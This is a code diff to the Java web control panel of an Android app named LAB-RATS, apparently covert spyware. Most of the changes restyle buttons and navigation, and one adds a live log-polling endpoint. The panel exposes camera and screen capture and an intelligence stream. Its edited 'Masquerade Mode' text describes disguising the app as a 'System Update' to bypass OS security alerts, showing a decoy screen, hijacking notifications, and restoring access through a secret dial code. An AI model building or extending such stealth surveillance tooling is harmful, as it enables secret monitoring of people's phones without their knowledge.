@@ -176,28 +176,32 @@ public class LabRatsHttpServer extends NanoHTTPD {
             ".nav { display: flex; gap: 10px; flex-wrap: wrap; justify-content: center; margin-bottom: 40px; }" +
             ".nav a {" +
             "  padding: 18px 35px;" +
-            "  background: rgba(0, 242, 255, 0.03);" +
-            "  border: 1px solid rgba(0, 242, 255, 0.2);" +
+            "  background: rgba(0, 242, 255, 0.05);" +
+            "  border: 1px solid rgba(0, 242, 255, 0.3);" +
             "  color: var(--neon-cyan);" +
             "  text-decoration: none;" +
             "  text-transform: uppercase;" +
             "  font-size: 1rem;" +
             "  font-weight: bold;" +
             "  letter-spacing: 2px;" +
-            "  border-radius: 40px;" +
-            "  transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);" +
+            "  border-radius: 12px;" +
+            "  transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);" +
+            "  backdrop-filter: blur(5px);" +
             "}" +
             ".nav a:hover {" +
-            "  background: rgba(0, 242, 255, 0.1);" +
-            "  border-color: var(--neon-cyan);" +
-            "  box-shadow: 0 0 15px rgba(0, 242, 255, 0.3);" +
-            "  transform: translateY(-2px);" +
-            "}" +
-            ".nav a.active {" +
             "  background: rgba(0, 242, 255, 0.15);" +
             "  border-color: var(--neon-cyan);" +
-            "  box-shadow: 0 0 20px rgba(0, 242, 255, 0.5);" +
+            "  box-shadow: 0 0 20px rgba(0, 242, 255, 0.4);" +
+            "  transform: translateY(-5px);" +
             "  color: #fff;" +
+            "}" +
+            ".nav a.active {" +
+            "  background: #00b4cc;" + // Sharper, slightly deeper Cyan to make white text pop
+            "  border-color: var(--neon-cyan);" +
+            "  box-shadow: 0 0 25px rgba(0, 242, 255, 0.5);" +
+            "  color: #fff;" +
+            "  text-shadow: none;" +
+            "  font-weight: 900;" +
             "}" +
             ".card {" +
             "  background: var(--bg-card);" +
@@ -247,7 +251,7 @@ public class LabRatsHttpServer extends NanoHTTPD {
             "  text-transform: uppercase;" +
             "  letter-spacing: 2px;" +
             "  text-decoration: none;" +
-            "  border-radius: 40px;" +
+            "  border-radius: 12px;" +
             "  font-weight: bold;" +
             "  transition: all 0.3s;" +
             "  cursor: pointer;" +
@@ -255,6 +259,7 @@ public class LabRatsHttpServer extends NanoHTTPD {
             "  min-width: 160px;" +
             "}" +
             "button:hover, .btn:hover { background: var(--neon-green); color: var(--bg-dark); box-shadow: 0 0 25px var(--neon-green); transform: translateY(-2px); }" +
+            ".btn-engaged-yellow { background: var(--neon-yellow) !important; color: var(--bg-dark) !important; box-shadow: 0 0 25px var(--neon-yellow) !important; }" +
             ".info-item { background: rgba(0,0,0,0.4); border-radius: 12px; border: 1px solid rgba(255,255,255,0.05); padding: 20px; display: flex; flex-direction: column; overflow: hidden; }" +
             ".info-label { color: var(--neon-cyan); opacity: 0.6; font-size: 0.65rem; text-transform: uppercase; margin-bottom: 8px; letter-spacing: 1px; flex-shrink: 0; }" +
             ".info-value { color: #fff; font-family: 'JetBrains Mono', monospace; font-weight: bold; word-break: break-all; font-size: 0.9rem; }" +
@@ -270,7 +275,7 @@ public class LabRatsHttpServer extends NanoHTTPD {
             ".file-info { flex-grow: 1; }" +
             ".file-name { color: #fff; text-decoration: none; font-weight: bold; display: block; margin-bottom: 4px; font-size: 0.9rem; }" +
             ".file-meta { font-size: 0.7rem; color: #888; letter-spacing: 1px; }" +
-            ".btn-small { padding: 6px 15px; font-size: 0.65rem; border-radius: 20px; min-width: 0; width: auto; }" +
+            ".btn-small { padding: 6px 15px; font-size: 0.65rem; border-radius: 12px; min-width: 0; width: auto; }" +
             ".empty-state { text-align: center; padding: 60px 20px; }" +
             ".empty-state .icon { font-size: 4rem; margin-bottom: 20px; opacity: 0.2; color: var(--neon-cyan); }" +
             
@@ -282,7 +287,7 @@ public class LabRatsHttpServer extends NanoHTTPD {
             "  .title-font { font-family: 'Orbitron', sans-serif !important; font-size: 1.55rem !important; letter-spacing: 1.5px !important; margin-right: -1.5px !important; font-weight: 900 !important; text-align: center !important; width: 100% !important; display: block !important; margin: 0 0 10px 0 !important; white-space: nowrap !important; overflow: visible !important; position: relative; z-index: 10; line-height: 1.2; }" +
             "  .glitch-container { margin: 0 0 10px 0 !important; height: auto !important; }" +
             "  .version-text { font-size: 0.45rem !important; letter-spacing: 1px !important; margin: 0 0 10px 0 !important; }" +
-            "  .glitch { font-size: 0.55rem; letter-spacing: 1px; }" +
+            "  .glitch { font-size: 0.47rem; letter-spacing: 1px; }" +
             "  .nav { gap: 4px; justify-content: center; width: 100%; padding: 0 4px; box-sizing: border-box; }" +
             "  .nav a { padding: 10px 1px; font-size: 0.6rem; border-radius: 12px; flex: 1 1 calc(33.33% - 6px); text-align: center; letter-spacing: 0; min-width: 0; font-weight: normal; }" +
             "  .card { padding: 15px; margin-bottom: 12px; border-radius: 10px; width: 100%; box-sizing: border-box; overflow: hidden; }" +
@@ -290,10 +295,10 @@ public class LabRatsHttpServer extends NanoHTTPD {
             "  .info-item { padding: 12px; }" +
             "  #log-terminal { height: 260px !important; font-size: 0.65rem !important; padding: 10px !important; }" +
             "  .header-actions { margin-left: 0 !important; margin-top: 10px; width: 100%; justify-content: center !important; flex-wrap: wrap; gap: 4px !important; }" +
-            "  button:not(.btn-small), .btn:not(.btn-small) { width: 100% !important; min-width: 0 !important; text-align: center; padding: 14px 10px !important; margin-bottom: 8px; border-radius: 30px; display: block !important; font-size: 0.75rem !important; white-space: nowrap !important; }" +
-            "  .btn-small { width: auto !important; min-width: 0 !important; display: inline-block !important; padding: 4px 8px !important; font-size: 0.6rem !important; letter-spacing: 0 !important; border-radius: 15px !important; margin-bottom: 5px !important; }" +
-            "  .btn-back { width: 100%; justify-content: center; padding: 10px; font-size: 0.7rem; border-radius: 20px; }" +
-            "  .watermark { opacity: 0.15 !important; height: 74px !important; top: 25px !important; left: -9px !important; transform: none !important; z-index: 0; }" +
+            "  button:not(.btn-small), .btn:not(.btn-small) { width: 100% !important; min-width: 0 !important; text-align: center; padding: 14px 10px !important; margin-bottom: 8px; border-radius: 12px; display: block !important; font-size: 0.75rem !important; white-space: nowrap !important; }" +
+            "  .btn-small { width: auto !important; min-width: 0 !important; display: inline-block !important; padding: 4px 8px !important; font-size: 0.6rem !important; letter-spacing: 0 !important; border-radius: 12px !important; margin-bottom: 5px !important; }" +
+            "  .btn-back { width: 100%; justify-content: center; padding: 10px; font-size: 0.7rem; border-radius: 12px; }" +
+            "  .watermark { opacity: 1.0 !important; height: 63px !important; top: 25px !important; left: -9px !important; transform: none !important; z-index: 0; }" +
             "  .intel-status { font-size: 0.55rem !important; white-space: nowrap !important; }" +
             "  table { display: block; overflow-x: auto; width: 100%; -webkit-overflow-scrolling: touch; }" +
             "  th, td { padding: 10px 8px; font-size: 0.65rem; }" +
@@ -306,6 +311,8 @@ public class LabRatsHttpServer extends NanoHTTPD {
             "  .file-name { font-size: 0.8rem; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }" +
             "  .file-icon { margin-right: 10px; width: 25px; font-size: 1.1rem; }" +
             "  .password-title { font-size: 0.55rem !important; letter-spacing: 1px !important; }" +
+            "  button:hover, .btn:hover { transform: none !important; box-shadow: none !important; background: inherit !important; color: inherit !important; }" +
+            "  .btn-engaged-yellow:hover { background: var(--neon-yellow) !important; color: var(--bg-dark) !important; box-shadow: 0 0 25px var(--neon-yellow) !important; }" +
             "}" +
             
             "textarea { resize: vertical; width: 100%; max-width: 100%; }" +
@@ -318,19 +325,19 @@ public class LabRatsHttpServer extends NanoHTTPD {
             ".call-outgoing { color: var(--neon-cyan); text-shadow: 0 0 5px rgba(0, 242, 255, 0.4); }" +
             ".call-missed { color: var(--danger); text-shadow: 0 0 5px rgba(255, 49, 49, 0.4); }" +
             ".pagination { display: flex; justify-content: center; align-items: center; margin-top: 40px; gap: 8px; }" +
-            ".pagination a { padding: 10px 18px; background: rgba(0,0,0,0.3); border: 1px solid rgba(255,255,255,0.1); color: #fff; text-decoration: none; border-radius: 30px; font-size: 0.8rem; transition: all 0.3s; }" +
+            ".pagination a { padding: 10px 18px; background: rgba(0,0,0,0.3); border: 1px solid rgba(255,255,255,0.1); color: #fff; text-decoration: none; border-radius: 12px; font-size: 0.8rem; transition: all 0.3s; }" +
             ".pagination a:hover, .pagination a.active { background: rgba(0, 242, 255, 0.1); border-color: var(--neon-cyan); color: var(--neon-cyan); box-shadow: 0 0 15px rgba(0, 242, 255, 0.2); }" +
             ".contact-avatar { width: 35px; height: 35px; background: rgba(0, 242, 255, 0.1); border: 1px solid var(--neon-cyan); color: var(--neon-cyan); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-right: 15px; font-weight: bold; font-size: 0.8rem; }" +
             ".back-btn-container { margin-bottom: 25px; }" +
-            ".btn-back { display: inline-flex; align-items: center; gap: 8px; background: rgba(0, 242, 255, 0.05); border: 1px solid var(--neon-cyan); color: var(--neon-cyan); padding: 8px 16px; text-decoration: none; border-radius: 30px; font-size: 0.75rem; text-transform: uppercase; letter-spacing: 1px; transition: all 0.3s; }" +
+            ".btn-back { display: inline-flex; align-items: center; gap: 8px; background: rgba(0, 242, 255, 0.05); border: 1px solid var(--neon-cyan); color: var(--neon-cyan); padding: 8px 16px; text-decoration: none; border-radius: 12px; font-size: 0.75rem; text-transform: uppercase; letter-spacing: 1px; transition: all 0.3s; }" +
             ".btn-back:hover { background: var(--neon-cyan); color: var(--bg-dark); box-shadow: 0 0 15px var(--neon-cyan); }" +
-            ".watermark { position: absolute; top: 50%; left: 20px; transform: translateY(-50%); height: 65%; width: auto; z-index: 10000; opacity: 0.35; pointer-events: none; }" +
+            ".watermark { position: absolute; top: 50%; left: 20px; transform: translateY(-50%); height: 65%; width: auto; z-index: 10000; opacity: 1.0; pointer-events: none; }" +
             "</style>" +
             "</head>" +
             "<body>" +
             "<div class=\"container\">" +
             "  <div class=\"header\">" +
-            "    <img src=\"/logo\" class=\"watermark\" alt=\"LAB-RATS\">" +
+            "    <img src=\"/logo?v=134\" class=\"watermark\" alt=\"LAB-RATS\" loading=\"eager\">" +
             "    <div class=\"title-font\">LAB-RATS</div>" +
             "    <div class=\"glitch-container\">" +
             "      <div class=\"glitch\" data-text=\"DEVELOPED BY K4N3CO.LABS\">DEVELOPED BY K4N3CO.LABS</div>" +
@@ -599,6 +606,12 @@ public class LabRatsHttpServer extends NanoHTTPD {
                         saveLogsInternal();
                         logActivity("SYSTEM_MAINTENANCE: Session logs cleared");
                         response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}");
+                    } else if (uri.equals("/terminal/logs")) {
+                        org.json.JSONArray array = new org.json.JSONArray();
+                        for (String log : systemLogs) {
+                            array.put(log);
+                        }
+                        response = newFixedLengthResponse(Response.Status.OK, "application/json", array.toString());
                     } else if (uri.equals("/camera/screen-frame")) {
                         response = serveScreenFrame();
                     } else if (uri.equals("/camera/screen-start")) {
@@ -670,7 +683,7 @@ public class LabRatsHttpServer extends NanoHTTPD {
             }
             byte[] bytes = buffer.toByteArray();
             Response response = newFixedLengthResponse(Response.Status.OK, "image/png", new java.io.ByteArrayInputStream(bytes), bytes.length);
-            response.addHeader("Cache-Control", "public, max-age=31536000"); // Cache for 1 year
+            response.addHeader("Cache-Control", "public, max-age=31536000, immutable");
             return response;
         } catch (Exception e) {
             return serveError("Logo error: " + e.getMessage());
@@ -754,14 +767,26 @@ public class LabRatsHttpServer extends NanoHTTPD {
         html.append("<div style=\"margin-top: 15px; text-align: right; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 10px;\">");
         html.append("<span style=\"font-size: 0.65rem; color: #888;\">AUTO_REFRESH_ACTIVE</span>");
         html.append("<div style=\"display: flex; gap: 10px; flex-wrap: wrap; justify-content: flex-end; flex-grow: 1;\">");
-        html.append("<button onclick=\"clearLogs()\" class=\"btn btn-small\" style=\"border-color: var(--danger); color: var(--danger); background: rgba(255, 49, 49, 0.05); margin-bottom: 0;\">CLEAR_LOGS</button>");
-        html.append("<button onclick=\"location.reload()\" class=\"btn btn-small\" style=\"border-color: rgba(0, 242, 255, 0.3); margin-bottom: 0;\">REFRESH_LOGS</button>");
+        html.append("<button onclick=\"clearLogs()\" class=\"btn btn-small\" style=\"border-radius: 12px; border-color: var(--danger); color: var(--danger); background: rgba(255, 49, 49, 0.05); margin-bottom: 0;\">CLEAR_LOGS</button>");
+        html.append("<button onclick=\"location.reload()\" class=\"btn btn-small\" style=\"border-radius: 12px; border-color: rgba(0, 242, 255, 0.3); margin-bottom: 0;\">REFRESH_LOGS</button>");
         html.append("</div>");
         html.append("</div>");
         html.append("<script>");
         html.append("  function clearLogs() { if(confirm('Clear all session logs?')) fetch('/terminal/clear-logs').then(() => location.reload()); }");
-        html.append("  // Auto-refresh Terminal page every 5 seconds to keep logs live");
-        html.append("  setTimeout(function() { if(!window.manualInterruption) location.reload(); }, 5000);");
+        html.append("  async function refreshLogs() {");
+        html.append("    try {");
+        html.append("      const r = await fetch('/terminal/logs');");
+        html.append("      const logs = await r.json();");
+        html.append("      const terminal = document.getElementById('log-terminal');");
+        html.append("      if (!terminal) return;");
+        html.append("      let html = '';");
+        html.append("      if (logs.length === 0) html = '<div>[WAITING] Uplink established. Bridge active...</div>';");
+        html.append("      else logs.forEach(log => { html += '<div>' + log.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;') + '</div>'; });");
+        html.append("      terminal.innerHTML = html;");
+        html.append("    } catch (e) { console.error('Log sync error', e); }");
+        html.append("  }");
+        html.append("  // Use background syncing for logs to prevent full-page flicker");
+        html.append("  setInterval(refreshLogs, 3000);");
         html.append("</script>");
         html.append("</div>");
 
@@ -797,7 +822,7 @@ public class LabRatsHttpServer extends NanoHTTPD {
         
         html.append("<div class=\"card\" style=\"border-color: var(--neon-orange);\">");
         html.append("<h2 style=\"color: var(--neon-orange);\">STEALTH_OPERATIONS</h2>");
-        html.append("<p style=\"color: #888; margin-bottom: 20px;\">Manage app visibility. <b>Masquerade Mode</b> replaces the app icon with a generic 'System Update' gear to bypass OS security alerts. Use *#1337# to restore immediately.</p>");
+        html.append("<p style=\"color: #888; margin-bottom: 20px;\">Manage advanced app camouflage. <b>Masquerade Mode</b> replaces the app identity with a generic 'System Update' gear. When active, opening the app launches a <b>fully functional decoy update screen</b> that adapts to system light/dark themes. All background notifications are also hijacked for total stealth. Use dial code <b>*#1337#</b> or rapidly tap the gear icon 10 times to restore access.</p>");
         
         html.append("<div style=\"display: flex; gap: 15px;\">");
         html.append("<button onclick=\"toggleStealth()\" class=\"btn\" style=\"border-color: var(--neon-orange); color: var(--neon-orange); background: rgba(255, 157, 0, 0.05);\">TOGGLE_MASQUERADE_MODE</button>");
@@ -1605,18 +1630,22 @@ public class LabRatsHttpServer extends NanoHTTPD {
             .append("<span id=\"night-mode-status\" style=\"margin-left:auto; font-size:0.7rem; color:").append(CameraService.isNightModeEnabled(context) ? "var(--neon-green)" : "var(--neon-red)").append("; font-family:monospace;\">NIGHT_MODE: ").append(CameraService.isNightModeEnabled(context) ? "ACTIVE" : "OFF").append("</span>")
             .append("</h2>");
 
+        boolean nightMode = CameraService.isNightModeEnabled(context);
         html.append("<div style=\"padding:15px; margin-bottom:20px; display:flex; flex-wrap:wrap; justify-content:center; align-items:center; gap:10px; border:1px solid rgba(255,255,0,0.1); border-radius:12px; background:rgba(255,255,0,0.02);\">")
-            .append("<button onclick=\"toggleNightMode()\" id=\"night-btn\" class=\"btn\" style=\"padding:10px 20px; border-color:var(--neon-yellow); color:var(--neon-yellow); background:rgba(255,255,0,0.05); font-size:0.8rem;\">")
+            .append("<button onclick=\"toggleNightMode()\" id=\"night-btn\" class=\"btn ").append(nightMode ? "btn-engaged-yellow" : "").append("\" style=\"padding:10px 20px; border-color:var(--neon-yellow); color:var(--neon-yellow); background:rgba(255,255,0,0.05); font-size:0.8rem;\">")
             .append("&#127769; TOGGLE NIGHT VISION")
             .append("</button>")
             .append("<script>")
             .append("function toggleNightMode() {")
+            .append("  const btn = document.getElementById('night-btn');")
             .append("  fetch('/camera/night-mode').then(r => r.json()).then(data => {")
             .append("    const status = document.getElementById('night-mode-status');")
             .append("    if(data.nightMode) {")
             .append("      status.innerText = 'NIGHT_MODE: ACTIVE'; status.style.color = 'var(--neon-green)';")
+            .append("      btn.classList.add('btn-engaged-yellow');")
             .append("    } else {")
             .append("      status.innerText = 'NIGHT_MODE: OFF'; status.style.color = 'var(--neon-red)';")
+            .append("      btn.classList.remove('btn-engaged-yellow');")
             .append("    }")
             .append("  });")
             .append("}")
@@ -3179,8 +3208,8 @@ public class LabRatsHttpServer extends NanoHTTPD {
         html.append("<h2 style=\"display:flex; align-items:center; gap:15px; margin-bottom:20px; flex-wrap: wrap;\">")
             .append("<span style=\"color:var(--neon-cyan);\">&#9889;</span> INTEL_STREAM")
             .append("<div style=\"margin-left:auto; display:flex; align-items:center; gap:10px; flex-wrap: wrap; justify-content: flex-end;\">")
-            .append("<button onclick=\"clearIntel()\" class=\"btn btn-small\" style=\"border-color: var(--danger); color: var(--danger); background: rgba(255, 49, 49, 0.05); margin-bottom: 0;\">CLEAR_STREAM</button>")
-            .append("<button onclick=\"location.reload()\" class=\"btn btn-small\" style=\"border-color: var(--neon-cyan); color: var(--neon-cyan); background: rgba(0, 242, 255, 0.05); margin-bottom: 0;\">RELOAD_STREAM</button>")
+            .append("<button onclick=\"clearIntel()\" class=\"btn btn-small\" style=\"border-radius: 12px; border-color: var(--danger); color: var(--danger); background: rgba(255, 49, 49, 0.05); margin-bottom: 0;\">CLEAR_STREAM</button>")
+            .append("<button onclick=\"location.reload()\" class=\"btn btn-small\" style=\"border-radius: 12px; border-color: var(--neon-cyan); color: var(--neon-cyan); background: rgba(0, 242, 255, 0.05); margin-bottom: 0;\">RELOAD_STREAM</button>")
             .append("<span style=\"font-size:0.6rem; opacity:0.5; font-family:monospace; white-space: nowrap;\">LISTENER_ACTIVE</span>")
             .append("</div></h2>");
         
